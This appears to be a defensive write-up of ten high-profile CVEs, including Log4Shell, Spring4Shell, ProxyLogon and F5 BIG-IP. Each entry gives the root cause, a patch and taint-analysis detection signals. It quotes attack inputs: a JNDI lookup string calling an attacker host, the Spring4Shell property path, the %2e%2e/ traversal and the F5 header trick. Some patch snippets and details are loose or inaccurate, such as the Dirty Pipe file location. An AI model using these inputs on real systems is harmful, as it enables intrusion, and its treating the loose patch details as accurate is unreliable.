# CVE Corpus Analysis — 10 Real Vulnerabilities

Detailed analysis of 10 high-impact CVEs with root-cause classification,
patch diffs, and detection notes for our AI taint-analysis pipeline.

---

## CVE-2021-44228 — Log4Shell (Apache Log4j 2)

**CVSS:** 10.0 (Critical)  
**CWE:** CWE-917 Improper Neutralization of Special Elements in an Expression Language Statement  
**Product:** Apache Log4j 2.0-beta9 – 2.14.1

### Root Cause
The `MessagePatternConverter` resolved `${jndi:ldap://attacker.com/x}` inside log
strings without sanitisation. Any logger call that included user-controlled input
(e.g. `log.error("User: " + userInput)`) triggered an outbound LDAP lookup and
remote class loading.

### Patch
```java
// Before (simplified)
String resolved = config.getStrSubstitutor().replace(event, msg);

// After: new lookup allow-list; JNDI disabled by default
System.setProperty("log4j2.formatMsgNoLookups", "true");
```

### AI Detection Signal
- Taint source: `HttpServletRequest.getHeader()`, `getParameter()`
- Sink: `Logger.info/error/warn/debug(tainted_string)`
- Pattern: taint flows into Log4j message without `StringEscapeUtils` sanitisation

---

## CVE-2021-3156 — Sudo Heap Buffer Overflow (Baron Samedit)

**CVSS:** 7.8 (High)  
**CWE:** CWE-122 Heap-based Buffer Overflow  
**Product:** Sudo ≤ 1.9.5p1

### Root Cause
`sudoedit -s` left a trailing backslash in argv that caused `set_cmnd()` to
miscalculate buffer size: `cmnd_size` was computed before stripping the `\`,
then `memcpy` wrote one extra byte past the allocation.

### Patch
```c
/* Before */
if (user_args[len-1] == '\\')
    user_args[--len] = '\0';   /* strip AFTER size calc — too late */

/* After: strip before any size calculation */
while (len > 0 && user_args[len-1] == '\\')
    user_args[--len] = '\0';
cmnd_size = /* recalculate here */;
```

### AI Detection Signal
- Pattern: `strlen` / manual length calc → `malloc(n)` → `memcpy(buf, src, n+k)`
- Off-by-one in escape-stripping loops before allocation

---

## CVE-2022-0847 — Dirty Pipe (Linux Kernel)

**CVSS:** 7.8 (High)  
**CWE:** CWE-281 Improper Preservation of Permissions  
**Product:** Linux kernel 5.8 – 5.16.10

### Root Cause
`copy_page_to_iter_pipe()` and `push_pipe()` failed to initialise the
`PIPE_BUF_FLAG_CAN_MERGE` flag in newly allocated pipe buffers.
An attacker could splice a read-only file into a pipe and overwrite its data.

### Patch
```c
/* kernel/pipe.c — added flag clear */
buf->flags &= ~PIPE_BUF_FLAG_CAN_MERGE;
```

### AI Detection Signal
- Uninitialized flag bits in kernel struct after allocation
- `splice()` + `write()` path with missing capability check

---

## CVE-2022-22965 — Spring4Shell (Spring Framework RCE)

**CVSS:** 9.8 (Critical)  
**CWE:** CWE-94 Improper Control of Generation of Code  
**Product:** Spring Framework 5.3.0-17, 5.2.0-19

### Root Cause
Spring's `DataBinder` allowed binding of HTTP request parameters to bean
properties including `class.classLoader.resources.context.parent.pipeline.first.*`,
which exposed Tomcat's `AccessLogValve` and allowed writing arbitrary JSPs to
the webroot.

### Patch
```java
// Added to DataBinder default disallowedFields
"class.*", "Class.*", "*.class.*", "*.Class.*"
```

### AI Detection Signal
- Taint: `request.getParameterMap()` → `DataBinder.bind()`
- Missing allowlist/blocklist for reflective property paths

---

## CVE-2021-21985 — VMware vCenter Server RCE

**CVSS:** 9.8 (Critical)  
**CWE:** CWE-20 Improper Input Validation  
**Product:** VMware vCenter Server 6.5–7.0

### Root Cause
The Virtual SAN Health Check plugin exposed a `/ui/h5-vsan/rest/` endpoint
with no authentication. The `ProxygenController` passed request bodies
directly to an internal GSON deserializer with polymorphic type resolution
enabled — classic Java deserialization gadget chain.

### Patch
- Removed the unauthenticated endpoint
- Disabled polymorphic deserialization in GSON config

### AI Detection Signal
- Unauthenticated REST endpoint + `ObjectInputStream.readObject()` or GSON
  `TypeAdapter` with `@type` field

---

## CVE-2022-30190 — Follina (MSDT RCE)

**CVSS:** 7.8 (High)  
**CWE:** CWE-610 Externally Controlled Reference to a Resource in Another Sphere  
**Product:** Windows MSDT (all supported versions, June 2022)

### Root Cause
Word's `ms-msdt:` URI handler executed PowerShell when processing the
`PCWDiagnostic` package with a crafted `IT_BrowseForFile` parameter.
No user interaction beyond opening the document was required.

### Patch
- Microsoft disabled the MSDT URL protocol handler via registry
- Word blocked `ms-msdt:` scheme in external content

### AI Detection Signal
- URI scheme whitelist bypass in Office macro/OLE handler
- Untrusted `href` flows to `ShellExecute` / `Process.Start`

---

## CVE-2021-26855 — ProxyLogon (Exchange Server SSRF)

**CVSS:** 9.8 (Critical)  
**CWE:** CWE-918 Server-Side Request Forgery  
**Product:** Microsoft Exchange Server 2013–2019

### Root Cause
The `ClientAccessFrontEnd` service authenticated requests using the `X-AnonResource-Backend`
header to proxy to a backend. The backend blindly trusted the `X-CommonAccessToken`
header that the frontend forwarded — allowing pre-auth SSRF to any Exchange backend URL.

### Patch
- Removed trust of externally supplied `X-CommonAccessToken`
- Added cryptographic signature to all intra-service tokens

### AI Detection Signal
- HTTP header used as authentication bypass: `request.getHeader("X-*")` forwarded without re-validation
- SSRF: user-controlled URL in `new HttpClient().get(url)` without allowlist

---

## CVE-2022-1388 — F5 BIG-IP iControl REST Auth Bypass

**CVSS:** 9.8 (Critical)  
**CWE:** CWE-306 Missing Authentication for Critical Function  
**Product:** F5 BIG-IP 13.1.x–16.1.x

### Root Cause
The iControl REST API checked `X-F5-Auth-Token` OR `Authorization` headers,
but an internal loopback rewrite rule matched `/mgmt/tm/util/bash` before
authentication middleware ran. Supplying `Connection: X-F5-Auth-Token` caused
the connection header to consume the auth header in a hop-by-hop stripping bug.

### Patch
- Fixed middleware ordering so auth always runs before URL rewrite
- Removed hop-by-hop stripping of custom auth headers

### AI Detection Signal
- Middleware ordering bug: auth check registered after routing
- `Connection` header hop-by-hop stripping of security headers

---

## CVE-2021-41773 — Apache HTTP Server Path Traversal

**CVSS:** 7.5 (High) / 9.8 with mod_cgi  
**CWE:** CWE-22 Path Traversal  
**Product:** Apache httpd 2.4.49

### Root Cause
A bug in `ap_normalize_path()` allowed `%2e%2e/` (URL-encoded `../`) to
bypass the path normalisation that strips `..` segments, enabling directory
traversal out of the document root.

### Patch
```c
/* Before: only stripped literal "../" */
/* After: decode percent-encoding before normalisation */
if (IS_SLASH(path[i]) && path[i+1] == '.' && path[i+2] == '.'
    && (IS_SLASH(path[i+3]) || path[i+3] == '\0')) { ... }
/* Added: ap_unescape_url() called first */
```

### AI Detection Signal
- Percent-encoded path components flowing to filesystem access without
  double-decode normalisation

---

## CVE-2021-45046 — Log4j2 Context Lookup Bypass (Log4Shell follow-up)

**CVSS:** 9.0 (Critical)  
**CWE:** CWE-917  
**Product:** Apache Log4j 2.15.0

### Root Cause
The 2.15.0 patch for CVE-2021-44228 was incomplete: non-default
`PatternLayout` configurations using Thread Context Map (MDC) lookups
still allowed `${ctx:loginId}` to trigger JNDI lookups when the MDC value
contained a lookup expression.

### Patch (2.16.0)
- Disabled JNDI completely by default (`log4j2.enableJndi=false`)
- Removed message-level lookup expansion entirely in non-`%msg` contexts

### AI Detection Signal
- Second-order taint: user data → MDC.put() → log message containing `${ctx:*}`
- Incomplete sanitisation: only direct `${jndi:}` blocked, not nested via MDC

---

## Summary Table

| CVE | CVSS | Type | Language | AI-Detectable? |
|-----|------|------|----------|---------------|
| CVE-2021-44228 | 10.0 | EL Injection | Java | ✅ Taint flow |
| CVE-2021-3156 | 7.8 | Heap BoF | C | ✅ Off-by-one |
| CVE-2022-0847 | 7.8 | Uninit flag | C | ⚠️ Kernel only |
| CVE-2022-22965 | 9.8 | RCE via binding | Java | ✅ Taint flow |
| CVE-2021-21985 | 9.8 | Deser RCE | Java | ✅ Deser sink |
| CVE-2022-30190 | 7.8 | URI handler | Win/VBA | ⚠️ OS-level |
| CVE-2021-26855 | 9.8 | SSRF | .NET/C# | ✅ SSRF sink |
| CVE-2022-1388 | 9.8 | Auth bypass | Python | ✅ Middleware |
| CVE-2021-41773 | 9.8 | Path traversal | C | ✅ Path taint |
| CVE-2021-45046 | 9.0 | EL Injection | Java | ✅ 2nd-order |

**AI detection rate (estimated): 8/10 (80%)** — kernel and OS-level vulns are
the hardest for static taint analysis; all Java/Python/C userspace vulns have
clear taint-flow signatures detectable by our P6 pipeline.
